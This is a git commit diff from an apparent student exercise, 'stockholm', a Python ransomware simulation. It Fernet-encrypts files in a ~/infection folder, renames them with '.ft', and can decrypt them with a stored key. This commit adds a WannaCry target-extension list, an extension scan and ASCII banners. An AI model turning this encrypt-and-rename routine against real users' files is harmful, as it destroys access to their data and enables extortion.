af2db8de16d4adcfd526e95166bdc0ab704032cd
Sacha Leclercq <salecler@c1r15s2.42madrid.com>
2022-08-09 15:41:33 +0200

    005 [Add][Modified] Adding dictionnary with all file's extensions affected by Wcry Ransomware.

--- stockholm.py
+++ stockholm.py
@@ -3,13 +3,24 @@ import argparse
 from cryptography.fernet import Fernet
 from getpass import getuser
 from time import sleep
+from tqdm import tqdm
 
 user = getuser()
 user_dir = '/home/' + user
 default_dir = '/home/' + user + '/infection/'
 
-# Adding all the files in scanned_files list
-scanned_files = []
+# List with all files !
+ext_list = []
+
+# Adding all the files that are encrypted by Wannacry to the list
+files_wcry = []
+
+with open("dictionnary_wcry.txt", "rb") as thedic:
+    files_wcry = thedic.read()
+
+test = "bonjour.txt"
+last = os.path.splitext(test)[1]
+print(last)
 
 # Flags
 parser = argparse.ArgumentParser(
@@ -23,23 +34,42 @@ parser = argparse.ArgumentParser(
     Use it at your own risk and enjoy! - salecler """
     )
 # Version
-parser.add_argument('-v', '--version', action='store_true', help='Show version of the program.')
+parser.add_argument('-v', '--version', action='store_true', help='show version of the program.')
 # Reverse
-parser.add_argument('-r', '--reverse', action='store_true', help="Decrypt all the files and subdirectories. Also change back the file's extension.")
+parser.add_argument('-r', '--reverse', action='store_true', help="decrypt all the files and subdirectories. Also change back the file's extension.")
 # Silent
-parser.add_argument('-s', '--silent', action='store_true', help='Will silent the program.')
+parser.add_argument('-s', '--silent', action='store_true', help='will silent the program.')
 
 args = parser.parse_args()
+
+# All files present in default_dir
+for element in os.listdir(default_dir):
+    if os.path.isfile(os.path.join(default_dir, element)):
+        ext = os.path.splitext(element)[1]
+        ext_list.append(ext)
+    
+print(ext_list)
 if args.version == True and args.reverse == True:
     err = "You are not allowed to use both flags at the same time."
     print(err)
     exit
 elif args.version == True:
     os.system("clear")
-    #print(lil_stockholm)
-    #print("Version 1.1 - ", salecler)
+    print("""┏━┳┓╋╋╋╋┏┓┏┓
+┃━┫┗┳━┳━┫┣┫┗┳━┳┓┏━━┓
+┣━┃┏┫╋┃━┫━┫┃┃╋┃┗┫┃┃┃
+┗━┻━┻━┻━┻┻┻┻┻━┻━┻┻┻┛""")   
+    print("Version 1.1 - ", "ｓａｌｅｃｌｅｒ")
 elif args.reverse == True:
-    print("reversing...")
+    os.system("clear")
+    print("""╔═╗░░░░░╔═╗╔══════╗░╔════╗░╔═╗░░╔═╗╔═╗░░╔═╗░╔════╗░░╔════╗░░░░╔═╗░░░░╔═════╗ 
+║██░╔═╗░║██╚███████╔╝█████╗║██░░║██╚██╗░║██╔╝█████╗╔╝█████╗░░░║██░░░╔╝██████ 
+║██╔╝██╗║██░░░░░║██║██░░║██║██══╝██░╚██═╝██╚██░░║██║██░░║██░░░║██░░░╚██═══╗░ 
+║██╝████╝██░░░░░║██║██░░║██║███████░╔═█████╔═╗░░║██║██░░║██░░░║██░░░░╚█████╗ 
+║████░╚████░░░░░║██╚██══╝██║██░░║██╔╝██░║██╚██══╝██╚██══╝██╔══╝██══╗╔════╝██ 
+╚███░░░╚███░░░░░╚██░╚█████░╚██░░╚██╚██░░╚██░╚█████░░╚█████░╚████████╚██████░""")
+    sleep(1)
+    os.system("clear")
     os.chdir(user_dir)
     with open("key", "rb") as thekey:
         secret_key = thekey.read()
@@ -52,7 +82,44 @@ elif args.reverse == True:
             thearchive.write(de_content)
         base = os.path.splitext(element)[0]
         os.rename(element, base)
+    print("""██████╗░███████╗░█████╗░██████╗░██╗░░░██╗██████╗░████████╗██╗███╗░░██╗░██████╗░░░░░░░░░░
+██╔══██╗██╔════╝██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██║████╗░██║██╔════╝░░░░░░░░░░
+██║░░██║█████╗░░██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░██║██╔██╗██║██║░░██╗░░░░░░░░░░
+██║░░██║██╔══╝░░██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░██║██║╚████║██║░░╚██╗░░░░░░░░░
+██████╔╝███████╗╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██║██║░╚███║╚██████╔╝██╗██╗██╗
+╚═════╝░╚══════╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═╝╚═╝░░╚══╝░╚═════╝░╚═╝╚═╝╚═╝""")
+    sleep(1)
+    seconds = 10
+    for i in tqdm(range(seconds)):
+        sleep(.300)
+    sleep(2)
+    os.system("clear")
+    print("""███████╗██╗██╗░░░░░███████╗░██████╗  ██╗░░██╗░█████╗░██╗░░░██╗███████╗  ██████╗░███████╗███████╗███╗░░██╗
+██╔════╝██║██║░░░░░██╔════╝██╔════╝  ██║░░██║██╔══██╗██║░░░██║██╔════╝  ██╔══██╗██╔════╝██╔════╝████╗░██║
+█████╗░░██║██║░░░░░█████╗░░╚█████╗░  ███████║███████║╚██╗░██╔╝█████╗░░  ██████╦╝█████╗░░█████╗░░██╔██╗██║
+██╔══╝░░██║██║░░░░░██╔══╝░░░╚═══██╗  ██╔══██║██╔══██║░╚████╔╝░██╔══╝░░  ██╔══██╗██╔══╝░░██╔══╝░░██║╚████║
+██║░░░░░██║███████╗███████╗██████╔╝  ██║░░██║██║░░██║░░╚██╔╝░░███████╗  ██████╦╝███████╗███████╗██║░╚███║
+╚═╝░░░░░╚═╝╚══════╝╚══════╝╚═════╝░  ╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝  ╚═════╝░╚══════╝╚══════╝╚═╝░░╚══╝
 
+░█████╗░░█████╗░██████╗░██████╗░███████╗░█████╗░████████╗██╗░░░░░██╗░░░██╗
+██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║░░░░░╚██╗░██╔╝
+██║░░╚═╝██║░░██║██████╔╝██████╔╝█████╗░░██║░░╚═╝░░░██║░░░██║░░░░░░╚████╔╝░
+██║░░██╗██║░░██║██╔══██╗██╔══██╗██╔══╝░░██║░░██╗░░░██║░░░██║░░░░░░░╚██╔╝░░
+╚█████╔╝╚█████╔╝██║░░██║██║░░██║███████╗╚█████╔╝░░░██║░░░███████╗░░░██║░░░
+░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝░╚════╝░░░░╚═╝░░░╚══════╝░░░╚═╝░░░
+
+██████╗░███████╗░█████╗░██████╗░██╗░░░██╗██████╗░████████╗███████╗██████╗░
+██╔══██╗██╔════╝██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗
+██║░░██║█████╗░░██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░█████╗░░██║░░██║
+██║░░██║██╔══╝░░██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░██╔══╝░░██║░░██║
+██████╔╝███████╗╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░███████╗██████╔╝
+╚═════╝░╚══════╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚══════╝╚═════╝░""")
+    print("\n\n\n\n\n\nｓａｌｅｃｌｅｒ")
+    sleep(2)
+    os.system('clear')
+
+
+        
 # Encrypt the files
 elif args.reverse == False and args.version == False:
         # Create the key
@@ -72,4 +139,3 @@ elif args.reverse == False and args.version == False:
             thenewfile.write(encrypted_content)
     for archive in os.listdir(default_dir):
         os.rename(archive, archive + '.ft')
-        
